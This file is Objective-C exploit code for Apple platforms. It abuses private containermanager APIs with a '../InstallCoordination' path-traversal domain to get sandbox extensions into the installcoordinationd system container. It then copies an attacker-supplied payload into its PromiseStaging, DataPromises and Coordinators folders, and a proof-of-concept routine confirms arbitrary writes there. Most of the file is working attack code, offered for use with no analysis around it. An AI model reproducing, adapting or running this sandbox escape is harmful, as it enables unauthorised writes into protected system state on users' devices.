/*
 * Minimal InstallCoordination delivery path.
 *
 * payloadRoot must contain PromiseStaging, DataPromises, and Coordinators.
 * This function does nothing until the caller invokes stage_installcoord_payload().
 */

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdbool.h>
#import <stdint.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>

typedef void *container_query_t;

typedef struct {
    void *handle;
    container_query_t (*create)(void);
    void (*setClass)(container_query_t, uint64_t);
    void (*setGroup)(container_query_t, xpc_object_t);
    void (*setFlags)(container_query_t, uint64_t);
    void (*setPart)(container_query_t, uint64_t);
    void (*setDomain)(container_query_t, const char *);
    void *(*result)(container_query_t);
    void *(*objectCopy)(void *);
    void (*objectFree)(void *);
    const char *(*objectPath)(void *);
    char *(*copyToken)(void *);
    bool (*activate)(void *, bool);
    void (*queryFree)(container_query_t);
} InstallCoordAPI;

static NSMutableArray<NSDictionary<NSString *, NSValue *> *> *activeLeases;

static InstallCoordAPI *SharedAPI(void)
{
    static InstallCoordAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.handle = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (api.handle == NULL) {
            return;
        }
#define LOAD(field, symbol) \
        api.field = (__typeof(api.field))dlsym(api.handle, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroup, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(setDomain, "container_query_operation_set_part_domain");
        LOAD(result, "container_query_get_single_result");
        LOAD(objectCopy, "container_object_copy");
        LOAD(objectFree, "container_object_free");
        LOAD(objectPath, "container_object_get_path");
        LOAD(copyToken, "container_copy_sandbox_token");
        LOAD(activate, "container_object_sandbox_extension_activate");
        LOAD(queryFree, "container_query_free");
#undef LOAD
    });
    return &api;
}

static void ReleaseActiveQueries(void)
{
    InstallCoordAPI *api = SharedAPI();
    if (api->queryFree == NULL || api->objectFree == NULL) {
        return;
    }
    @synchronized (activeLeases) {
        for (NSDictionary<NSString *, NSValue *> *lease in activeLeases) {
            api->objectFree(lease[@"object"].pointerValue);
            api->queryFree(lease[@"query"].pointerValue);
        }
        [activeLeases removeAllObjects];
    }
}

static NSString *ActivateInstallCoordDomain(NSString *domain)
{
    InstallCoordAPI *api = SharedAPI();
    if (api->handle == NULL || api->create == NULL ||
        api->setClass == NULL || api->setGroup == NULL ||
        api->setFlags == NULL || api->setPart == NULL ||
        api->setDomain == NULL || api->result == NULL ||
        api->objectCopy == NULL || api->objectFree == NULL ||
        api->objectPath == NULL || api->copyToken == NULL ||
        api->activate == NULL || api->queryFree == NULL) {
        return nil;
    }

    container_query_t query = api->create();
    if (query == NULL) {
        return nil;
    }
    api->setClass(query, 13);
    xpc_object_t group = xpc_string_create(
        "systemgroup.com.apple.installcoordinationd");
    api->setGroup(query, group);
#if !OS_OBJECT_USE_OBJC
    xpc_release(group);
#endif
    api->setFlags(query, (UINT64_C(1) << 39) | (UINT64_C(1) << 32));
    api->setPart(query, 3);                     // Library/Caches
    api->setDomain(query, domain.fileSystemRepresentation);

    // The result is borrowed from the query. Keep the query alive until all
    // staged copies finish, then free it to revoke the extension.
    void *borrowed = api->result(query);
    void *object = borrowed != NULL ? api->objectCopy(borrowed) : NULL;
    const char *rawPath = object != NULL ? api->objectPath(object) : NULL;
    NSString *path = rawPath != NULL
        ? [NSString stringWithUTF8String:rawPath] : nil;
    char *token = object != NULL ? api->copyToken(object) : NULL;
    BOOL tokenPresent = token != NULL && token[0] != '\0';
    free(token);
    BOOL activated = tokenPresent && api->activate(object, false);
    int descriptor = activated && path.length != 0
        ? open(path.fileSystemRepresentation,
               O_RDONLY | O_DIRECTORY | O_CLOEXEC) : -1;
    int openError = descriptor >= 0 ? 0 : errno;
    BOOL directoryOpen = descriptor >= 0;
    if (descriptor >= 0) {
        close(descriptor);
    }
    fprintf(stderr,
        "INSTALLCOORD_LEASE domain=%s path=%s token=%d activated=%d "
        "directory_open=%d errno=%d\n",
        domain.UTF8String, path.UTF8String ?: "(null)", tokenPresent,
        activated, directoryOpen, openError);
    if (!directoryOpen) {
        if (object != NULL) {
            api->objectFree(object);
        }
        api->queryFree(query);
        return nil;
    }
    if (activeLeases == nil) {
        activeLeases = [NSMutableArray array];
    }
    [activeLeases addObject:@{
        @"query" : [NSValue valueWithPointer:query],
        @"object" : [NSValue valueWithPointer:object],
    }];
    return path;                                // keep query and copy alive
}

static BOOL CopyContents(NSString *source, NSString *destination,
                         NSMutableArray<NSString *> *created,
                         NSError **error)
{
    NSFileManager *fm = NSFileManager.defaultManager;
    NSArray<NSString *> *names = [fm contentsOfDirectoryAtPath:source
                                                         error:error];
    if (names == nil) {
        return NO;
    }
    for (NSString *name in names) {
        NSString *from = [source stringByAppendingPathComponent:name];
        NSString *to = [destination stringByAppendingPathComponent:name];
        if ([fm fileExistsAtPath:to]) {
            if (error != NULL) {
                *error = [NSError errorWithDomain:NSCocoaErrorDomain
                    code:NSFileWriteFileExistsError
                    userInfo:@{NSFilePathErrorKey: to}];
            }
            return NO;
        }
        if (![fm copyItemAtPath:from toPath:to error:error]) {
            return NO;
        }
        [created addObject:to];
    }
    return YES;
}

static void RemoveCreatedItems(NSArray<NSString *> *paths)
{
    NSFileManager *fm = NSFileManager.defaultManager;
    for (NSString *path in paths.reverseObjectEnumerator) {
        [fm removeItemAtPath:path error:nil];
    }
}

BOOL stage_installcoord_payload(NSString *payloadRoot, NSError **error)
{
    ReleaseActiveQueries();
    NSArray<NSString *> *parts = @[
        @"PromiseStaging", @"DataPromises", @"Coordinators"
    ];
    NSMutableDictionary<NSString *, NSString *> *destinations =
        [NSMutableDictionary dictionary];
    for (NSString *part in parts) {
        NSString *domain = [@"../InstallCoordination"
            stringByAppendingPathComponent:part];
        NSString *destination = ActivateInstallCoordDomain(domain);
        if (destination == nil) {
            ReleaseActiveQueries();
            return NO;                          // patched on 24A5408d
        }
        destinations[part] = destination;
    }

    NSMutableArray<NSString *> *created = [NSMutableArray array];
    // Commit order matters. The coordinator is the final commit record.
    for (NSString *part in parts) {
        if (!CopyContents(
                [payloadRoot stringByAppendingPathComponent:part],
                destinations[part], created,
                error)) {
            RemoveCreatedItems(created);
            ReleaseActiveQueries();
            return NO;
        }
    }
    ReleaseActiveQueries();
    return YES;
}

int run_installcoord_entry_poc(void)
{
    ReleaseActiveQueries();
    NSArray<NSString *> *parts = @[
        @"PromiseStaging", @"DataPromises", @"Coordinators"
    ];
    NSData *marker = [[NSString stringWithFormat:@"InstallCoordination %@\n",
        NSUUID.UUID.UUIDString] dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableArray<NSString *> *paths = [NSMutableArray array];
    BOOL success = YES;

    for (NSString *part in parts) {
        NSString *domain = [@"../InstallCoordination"
            stringByAppendingPathComponent:part];
        NSString *root = ActivateInstallCoordDomain(domain);
        if (root == nil) {
            success = NO;
            break;
        }
        NSString *path = [root stringByAppendingPathComponent:
            [NSString stringWithFormat:@".released-poc-%@", NSUUID.UUID.UUIDString]];
        BOOL absentBefore = access(path.fileSystemRepresentation, F_OK) != 0;
        BOOL wrote = absentBefore && [marker writeToFile:path atomically:NO];
        BOOL readBack = wrote &&
            [[NSData dataWithContentsOfFile:path] isEqualToData:marker];
        BOOL removed = unlink(path.fileSystemRepresentation) == 0;
        BOOL absentAfter = access(path.fileSystemRepresentation, F_OK) != 0;
        fprintf(stderr,
            "INSTALLCOORD part=%s root=%s wrote=%d readback=%d removed=%d\n",
            part.UTF8String, root.UTF8String, wrote, readBack, removed);
        success = success && readBack && removed && absentAfter;
        if (!absentAfter) {
            [paths addObject:path];
        }
    }

    for (NSString *path in paths) {
        unlink(path.fileSystemRepresentation);
    }
    ReleaseActiveQueries();
    fprintf(stderr, "INSTALLCOORD success=%d\n", success);
    return success ? 0 : 1;
}
